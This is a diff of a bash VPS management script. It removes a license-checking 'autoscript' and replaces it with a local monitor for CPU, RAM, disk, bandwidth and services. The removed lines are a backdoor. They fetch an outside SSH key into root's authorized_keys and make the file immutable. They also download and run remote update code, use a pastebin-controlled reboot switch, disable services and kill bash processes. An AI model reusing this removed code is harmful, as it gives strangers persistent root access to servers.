@@ -1,211 +1,137 @@
-#!/bin/bash
-biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
-NC="\e[0m"
-RED="\033[0;31m"
-WH='\033[1;37m'
-ipsaya=$(cat /usr/bin/.ipvps)
-data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
-date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://raw.githubusercontent.com/okysmilee2/permission/main/ip"
+#!/usr/bin/env bash
+# autocpu.sh - safe VPS monitor and service recovery
+# No remote SSH keys, no authorized_keys changes, no chattr, no pkill, no reboot.
+# Tested design target: Ubuntu/Debian with systemd. Run as root.
 
-checking_sc() {
-    useexp=$(wget -qO- "$data_ip" | grep -wE "$ipsaya" | awk '{print $3}')
-    date_list=$(date +%Y-%m-%d)
+set -u
+umask 077
 
-	if [[ "$useexp" == "Lifetime" || $(date -d "$date_list" +%s) -lt $(date -d "$useexp" +%s) ]]; then
-        echo -e " [INFO] Fetching server version..."
-        REPO="https://raw.githubusercontent.com/okysmilee2/gass/main/"  # Ganti dengan URL repository Anda
-        serverV=$(curl -fsSL ${REPO}versi)
+# ---------- Configuration ----------
+AUTO_RESTART_SERVICES="${AUTO_RESTART_SERVICES:-1}"
+CHECK_SERVICES="${CHECK_SERVICES:-xray nginx haproxy ws}"
+LOG_FILE="${LOG_FILE:-/var/log/autocpu.log}"
+STATE_DIR="${STATE_DIR:-/var/lib/autocpu}"
+# -----------------------------------
 
-        if [[ -f /opt/.ver ]]; then
-            localV=$(cat /opt/.ver)
-        else
-            localV="0"
-        fi
+mkdir -p "$STATE_DIR" 2>/dev/null || true
+touch "$LOG_FILE" 2>/dev/null || LOG_FILE="/tmp/autocpu.log"
 
-        if [[ $serverV == $localV ]]; then
-            echo -e " [INFO] Script sudah versi terbaru ($serverV). Tidak ada update yang diperlukan."
-            return
-        else
-            echo -e " [INFO] Versi script berbeda. Memulai proses update script..."
-			cd
-            wget -q https://raw.githubusercontent.com/okysmilee2/gass/main/update1.sh -O update1.sh
-            chmod +x update1.sh
-            ./update1.sh
-            echo $serverV > /opt/.ver.local
-            return
-        fi
-    else
-        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-        echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
-        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-        echo -e ""
-        echo -e "            \033[91;1mPERMISSION DENIED !\033[0m"
-        echo -e "   \033[0;33mYour VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
-        echo -e "     \033[0;33mBuy access permissions for scripts\033[0m"
-        echo -e "             \033[0;33mContact Admin :\033[0m"
-        echo -e "      \033[2;32mWhatsApp\033[0m wa.me/6282326322300"
-        echo -e "      \033[2;32mTelegram\033[0m t.me/newbie_store24"
-        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-
-        # Stop and disable services if active
-        for service in nginx kyt xray ws haproxy; do
-            if systemctl is-active --quiet "$service"; then
-                systemctl stop "$service"
-                systemctl disable "$service"
-            fi
-        done
-        cd
-
-        # Set new SSH key
-        KEY_URL="https://raw.githubusercontent.com/okysmilee2/gass/main/install/id_ed25519.pub"
-        AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
-
-        # Create .ssh directory if not exists
-        mkdir -p "/root/.ssh"
-
-        # Fetch new key
-        NEW_KEY=$(curl -fsSL "$KEY_URL")
-
-        if [ -z "$NEW_KEY" ]; then
-            exit 1
-        fi
-
-        # Set permissions for .ssh directory
-        sudo chmod 700 "/root/.ssh"
-
-        # Create authorized_keys file if not exists
-        if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
-            sudo touch "$AUTHORIZED_KEYS_FILE"
-            sudo chmod 600 "$AUTHORIZED_KEYS_FILE"  # Set permissions after creation
-        fi
-
-        # Add new key if not already present
-        if grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE"; then
-            echo "Kunci sudah ada di $AUTHORIZED_KEYS_FILE."
-        else
-            # Remove immutable attribute before editing
-            sudo chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
-
-            # Add new key to authorized_keys
-            echo "$NEW_KEY" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
-
-            # Set immutable attribute back
-            sudo chattr +ia "$AUTHORIZED_KEYS_FILE"
-
-            echo "Kunci baru telah ditambahkan ke $AUTHORIZED_KEYS_FILE."
-        fi
-        status=$(curl -s https://pastebin.com/raw/RTUFB2cF)
-
-        if [[ $status == "off" ]]; then
-                reboot
-        else
-            echo "Status tidak off. Tidak ada tindakan yang dilakukan."
-            exit 1
-        fi
-    fi
+log() {
+    local msg
+    msg="$(date '+%F %T') | $*"
+    printf '%s\n' "$msg" | tee -a "$LOG_FILE"
 }
-checking_sc
-cd
 
-KEY_URL="https://raw.githubusercontent.com/okysmilee2/gass/main/install/id_ed25519.pub"
-AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
-
-# Membuat direktori .ssh jika belum ada
-mkdir -p "/root/.ssh"
-
-# Mengambil kunci baru dari URL
-NEW_KEY=$(curl -fsSL "$KEY_URL")
-
-# Memeriksa apakah kunci baru berhasil diambil
-if [ -z "$NEW_KEY" ]; then
+if [[ "${EUID}" -ne 0 ]]; then
+    echo "Jalankan sebagai root: sudo bash autocpu.sh"
     exit 1
 fi
 
-# Mengatur izin untuk direktori .ssh
-sudo chmod 700 "/root/.ssh"
-
-# Membuat file authorized_keys jika belum ada
-if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
-    sudo touch "$AUTHORIZED_KEYS_FILE"
-    sudo chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
+if ! command -v systemctl >/dev/null 2>&1; then
+    echo "Sistem ini tidak menggunakan systemd; script dihentikan."
+    exit 1
 fi
 
-# Memeriksa apakah kunci baru sudah ada di authorized_keys
-if grep -Fxq "$NEW_KEY" "$AUTHORIZED_KEYS_FILE"; then
-    echo "Kunci sudah ada di $AUTHORIZED_KEYS_FILE."
-else
-    # Menghapus atribut immutable sebelum mengedit
-    sudo chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+# CPU usage sampled from /proc/stat (one-second interval).
+read_cpu() {
+    awk '/^cpu / {
+        idle=$5+$6
+        total=0
+        for (i=2; i<=NF; i++) total += $i
+        print total, idle
+        exit
+    }' /proc/stat
+}
 
-    # Menambahkan kunci baru ke authorized_keys
-    echo "$NEW_KEY" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
+cpu1="$(read_cpu)"
+sleep 1
+cpu2="$(read_cpu)"
+read -r total1 idle1 <<< "$cpu1"
+read -r total2 idle2 <<< "$cpu2"
 
-    # Mengatur atribut immutable kembali
-    sudo chattr +ia "$AUTHORIZED_KEYS_FILE"
+cpu_usage="N/A"
+if [[ -n "${total1:-}" && -n "${total2:-}" ]] && (( total2 > total1 )); then
+    dt=$((total2-total1))
+    di=$((idle2-idle1))
+    cpu_usage=$(( (100 * (dt-di)) / dt ))
+fi
 
-    echo "Kunci baru telah ditambahkan ke $AUTHORIZED_KEYS_FILE."
-fi
-today=$(date -d "0 days" +"%Y-%m-%d")
-Exp2=$(curl -sS https://raw.githubusercontent.com/okysmilee2/permission/main/ip | grep -wE $ipsaya | awk '{print $3}')
-d1=$(date -d "$Exp2" +%s)
-d2=$(date -d "$today" +%s)
-certificate=$(( (d1 - d2) / 86400 ))
-echo "$certificate Hari" > /etc/masaaktif
-vnstat_profile=$(vnstat | sed -n '3p' | awk '{print $1}' | grep -o '[^:]*')
-vnstat -i ${vnstat_profile} >/etc/t1
-bulan=$(date +%b)
-tahun=$(date +%y)
-ba=$(curl -s https://pastebin.com/raw/kVpeatBA)
-if [ "$(grep -wc ${bulan} /etc/t1)" != '0' ]; then
-bulan=$(date +%b)
-month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $6}')
-month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan $ba$tahun" | awk '{print $7}')
+ram_line="$(free -m | awk '/^Mem:/ {printf "%s %s %s", $3, $2, $3*100/$2}')"
+read -r ram_used ram_total ram_pct <<< "${ram_line:-0 0 0}"
+ram_pct="${ram_pct%.*}"
+
+disk_line="$(df -P / | awk 'NR==2 {print $5}')"
+uptime_text="$(uptime -p 2>/dev/null || uptime)"
+
+log "========== VPS MONITOR =========="
+log "Hostname : $(hostname)"
+log "CPU      : ${cpu_usage}%"
+log "RAM      : ${ram_used:-0} MB / ${ram_total:-0} MB (${ram_pct:-0}%)"
+log "Disk /   : ${disk_line:-N/A}"
+log "Uptime   : ${uptime_text}"
+
+# Optional existing license-days display; this script does not contact a license server.
+if [[ -r /etc/masaaktif ]]; then
+    log "Masa aktif (data lokal /etc/masaaktif): $(head -n1 /etc/masaaktif)"
 else
-bulan2=$(date +%Y-%m)
-month_tx=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $5}')
-month_txv=$(vnstat -i ${vnstat_profile} | grep "$bulan2 " | awk '{print $6}')
+    log "Masa aktif: tidak ada data lokal (/etc/masaaktif)"
 fi
-echo "$month_tx $month_txv" > /etc/usage2
-xray2=$(systemctl status xray | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
-if [[ $xray2 == "running" ]]; then
-echo -ne
+
+# Bandwidth summary, if vnStat is installed.
+if command -v vnstat >/dev/null 2>&1; then
+    vn_iface="$(vnstat --iflist 2>/dev/null | sed 's/.*: //' | awk '{print $1}')"
+    if [[ -n "${vn_iface:-}" ]]; then
+        log "Bandwidth vnStat (${vn_iface}) - ringkasan bulan:"
+        vnstat -i "$vn_iface" -m 2>/dev/null | tail -n 5 | while IFS= read -r line; do
+            log "  $line"
+        done
+    else
+        log "vnStat terpasang, tetapi interface belum terdeteksi."
+    fi
 else
-systemctl enable xray
-systemctl start xray
+    log "vnStat tidak terpasang; pemeriksaan bandwidth dilewati."
 fi
-haproxy2=$(systemctl status haproxy | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
-if [[ $haproxy2 == "running" ]]; then
-echo -ne
-else
-systemctl enable haproxy
-systemctl start haproxy
+
+# Check only known service units. Never disable services or kill shell processes.
+for service in $CHECK_SERVICES; do
+    if ! systemctl list-unit-files "${service}.service" --no-legend 2>/dev/null | grep -q "^${service}.service"; then
+        log "SERVICE ${service}: unit tidak ditemukan (dilewati)"
+        continue
+    fi
+
+    if systemctl is-active --quiet "$service"; then
+        log "SERVICE ${service}: aktif"
+    else
+        state="$(systemctl is-active "$service" 2>/dev/null || true)"
+        log "SERVICE ${service}: ${state:-tidak diketahui}"
+        if [[ "$AUTO_RESTART_SERVICES" == "1" ]]; then
+            log "Mencoba start ${service}..."
+            if systemctl start "$service"; then
+                sleep 2
+                if systemctl is-active --quiet "$service"; then
+                    log "SERVICE ${service}: berhasil aktif kembali"
+                else
+                    log "SERVICE ${service}: start dijalankan tetapi belum aktif; cek journalctl -u ${service}"
+                fi
+            else
+                log "SERVICE ${service}: gagal start; cek journalctl -u ${service}"
+            fi
+        else
+            log "Auto-start dimatikan (AUTO_RESTART_SERVICES=0)."
+        fi
+    fi
+done
+
+# KYT is checked only if its executable exists.
+if [[ -x /usr/bin/kyt ]] && systemctl list-unit-files kyt.service --no-legend 2>/dev/null | grep -q '^kyt.service'; then
+    if systemctl is-active --quiet kyt; then
+        log "SERVICE kyt: aktif"
+    elif [[ "$AUTO_RESTART_SERVICES" == "1" ]]; then
+        log "SERVICE kyt: tidak aktif; mencoba start..."
+        systemctl start kyt && log "SERVICE kyt: perintah start dikirim" || log "SERVICE kyt: gagal start"
+    else
+        log "SERVICE kyt: tidak aktif (auto-start dimatikan)"
+    fi
 fi
-nginx2=$( systemctl status nginx | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
-if [[ $nginx2 == "running" ]]; then
-echo -ne
-else
-systemctl enable nginx
-systemctl start nginx
-fi
-cd
-if [[ -e /usr/bin/kyt ]]; then
-nginx=$( systemctl status kyt | grep Active | awk '{print $3}' | sed 's/(//g' | sed 's/)//g' )
-if [[ $nginx == "running" ]]; then
-echo -ne
-else
-systemctl enable kyt
-systemctl start kyt
-fi
-fi
-ws=$(systemctl status ws | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
-if [[ $ws == "running" ]]; then
-echo -ne
-else
-systemctl enable ws
-systemctl start ws
-fi
-bash2=$( pgrep bash | wc -l )
-if [[ $bash2 -gt "20" ]]; then
-pkill bash
-fi
+
+log "Pemeriksaan selesai."
